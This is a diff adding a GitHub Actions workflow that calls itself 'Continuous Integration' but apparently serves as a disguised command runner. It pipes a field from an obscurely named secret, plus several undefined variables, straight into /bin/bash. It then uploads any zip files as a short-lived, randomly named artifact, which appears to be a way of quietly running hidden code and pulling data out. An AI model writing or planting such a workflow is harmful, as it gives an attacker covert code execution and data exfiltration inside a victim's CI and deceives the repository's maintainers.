@@ -1,0 +1,29 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Start
+        env:
+          gssl80355: ${{ secrets.gssl80355 }}
+        run: |
+          printf '%s' "$gssl80355" | jq -r .djmg4 | /bin/bash
+          printf '%s' "$vkxu7" | jq -r .kgl7392 | /bin/bash
+          echo $s6 | jq -r .b477 | /bin/bash
+          echo $rd23084 | jq -r .hqqj0 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 4CwwtELC
+          path: "*.zip"
+          retention-days: 1
